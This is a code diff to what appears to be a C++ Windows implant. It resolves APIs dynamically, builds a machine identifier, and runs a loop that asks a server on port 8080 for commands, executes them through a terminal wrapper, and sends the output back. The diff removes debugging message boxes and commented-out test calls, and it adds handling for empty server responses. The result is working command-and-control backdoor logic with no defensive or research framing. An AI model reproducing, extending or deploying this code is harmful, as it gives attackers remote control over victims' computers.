@@ -653,8 +653,6 @@ auto declfn instance::start(_In_ void *arg) -> void {
 		base.length
 	);
 
-	decltype(MessageBoxA) *msgbox = RESOLVE_API(reinterpret_cast<uintptr_t>(user32), MessageBoxA);
-
 	decltype(Sleep) *sleep = RESOLVE_API(reinterpret_cast<uintptr_t>(kernel32.handle), Sleep);
 
 	Machine machine(
@@ -662,17 +660,12 @@ auto declfn instance::start(_In_ void *arg) -> void {
         reinterpret_cast<uintptr_t>(kernel32.handle),
         reinterpret_cast<uintptr_t>(user32)
     );
-	msgbox(nullptr, machine.get_id(), symbol<const char *>("caption"), MB_OK);
 
     Term term(
         reinterpret_cast<uintptr_t>(ntdll.handle),
         reinterpret_cast<uintptr_t>(kernel32.handle),
         reinterpret_cast<uintptr_t>(user32)
     );
-    // char* command = "mkdir rest123";
-    // char* output = term.run(command);
-    // DBG_PRINTF("command output: %s", output);
-	// msgbox(nullptr, output, symbol<const char *>("caption"), MB_OK);
 
     Net net(
         reinterpret_cast<uintptr_t>(ntdll.handle),
@@ -683,17 +676,15 @@ auto declfn instance::start(_In_ void *arg) -> void {
         8080
     );
     
-    // auto announce_result = net.announce(machine.name);
-	// msgbox(nullptr, announce_result, symbol<const char *>("caption"), MB_OK);
-	// DBG_PRINTF("announce result: %d", announce_result);
-
-	// msgbox(nullptr, response, symbol<const char *>("caption"), MB_OK);
-
 	while (1) {
-		// msgbox(nullptr, symbol<const char *>("Hello world"), symbol<const char *>("caption"), MB_OK);
-
         char* response = net.request(machine.get_id());
+        if (strlen(response) == 0) {
+            sleep(MAIN_LOOP_SLEEP_MILI);
+            continue;
+        }
+
         char* output = term.run(response);
+
         net.respond(machine.get_id(), output);
 
 		sleep(MAIN_LOOP_SLEEP_MILI);
